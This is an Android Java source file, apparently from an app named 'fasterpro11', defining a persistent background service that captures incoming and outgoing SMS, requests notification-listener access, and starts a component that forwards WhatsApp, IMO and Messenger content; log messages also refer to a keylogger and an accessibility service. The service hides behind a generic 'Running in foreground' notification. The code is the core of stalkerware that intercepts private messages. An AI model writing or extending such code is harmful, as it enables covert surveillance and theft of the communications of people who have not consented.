package com.example.fasterpro11;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    private SmsReceiver smsReceiver;
    private OutgoingSmsObserver outgoingSmsObserver;
    private NotificationListener notificationListener;
    private WhatsAppIMOMessengerContent messengerContent; // Instance of your class
    private static final int NOTIFICATION_ID = 1; // Unique ID for the notification
    private static final String CHANNEL_ID = "foreground_service_channel"; // Notification channel ID

    @Override
    public void onCreate() {
        super.onCreate();

        // Initialize WhatsAppIMOMessengerContent
        messengerContent = new WhatsAppIMOMessengerContent();

        // Register SMS receiver
        smsReceiver = new SmsReceiver();
        IntentFilter smsFilter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        registerReceiver(smsReceiver, smsFilter);

        // Register outgoing SMS observer
        outgoingSmsObserver = new OutgoingSmsObserver(new Handler(), this);
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, outgoingSmsObserver);


        // Start the NotificationListenerService
        notificationListener = new NotificationListener();
        enableNotificationListener();

        // Start the service in the foreground
        startForeground(NOTIFICATION_ID, buildNotification());

        Log.d(TAG, "Service onCreate: Receiver, Observer, KeyloggerService, and MyAccessibilityService started");
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
        }

        Notification.Builder builder = new Notification.Builder(this)
                .setContentTitle("Foreground Service")
                .setContentText("Running in foreground")
                .setSmallIcon(R.drawable.notification_icon);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(CHANNEL_ID);
        }

        return builder.build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        // Unregister SMS receiver
        unregisterReceiver(smsReceiver);

        // Unregister outgoing SMS observer
        getContentResolver().unregisterContentObserver(outgoingSmsObserver);


        // Disable the NotificationListenerService
        disableNotificationListener();

        // Clean up WhatsAppIMOMessengerContent
        if (messengerContent != null) {
            messengerContent.stopForwarding(); // Call the stopForwarding method
            messengerContent = null;
        }

        Log.d(TAG, "Service onDestroy: Receiver, Observer, KeyloggerService, and MyAccessibilityService stopped");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void enableNotificationListener() {
        // Enable the NotificationListenerService
        // Check if the service is not already enabled
        ComponentName componentName = new ComponentName(this, NotificationListener.class);
        if (!isNotificationListenerEnabled(componentName)) {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    private void disableNotificationListener() {
        // Disable the NotificationListenerService
        // Check if the service is enabled before disabling
        ComponentName componentName = new ComponentName(this, NotificationListener.class);
        if (isNotificationListenerEnabled(componentName)) {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    private boolean isNotificationListenerEnabled(ComponentName componentName) {
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(componentName.flattenToString());
    }
}
